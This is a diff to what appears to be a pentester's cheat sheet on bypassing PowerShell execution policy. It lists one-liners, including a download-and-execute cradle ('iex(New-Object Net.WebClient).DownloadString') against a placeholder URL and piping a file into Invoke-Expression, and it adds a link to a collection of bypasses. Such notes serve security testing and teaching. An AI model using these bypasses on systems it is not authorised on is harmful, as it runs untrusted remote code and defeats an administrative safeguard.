@@ -4,5 +4,11 @@
 - powershell -noprofile -noexit -c "Get-Content runme.ps1 | PowerShell.exe -noprofile -"
 - powershell -noprofile -c "iex(New-Object Net.WebClient).DownloadString('url')"
 
+## Bypass inside de shell
+Get-content [file-name] | invoke-Expression
+
 ## Modify current Execution policy
 - Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+## Coleccion de bypass
+https://www.hackplayers.com/2018/07/recopilatorio-bypasses-powershell-executionpolicy.html
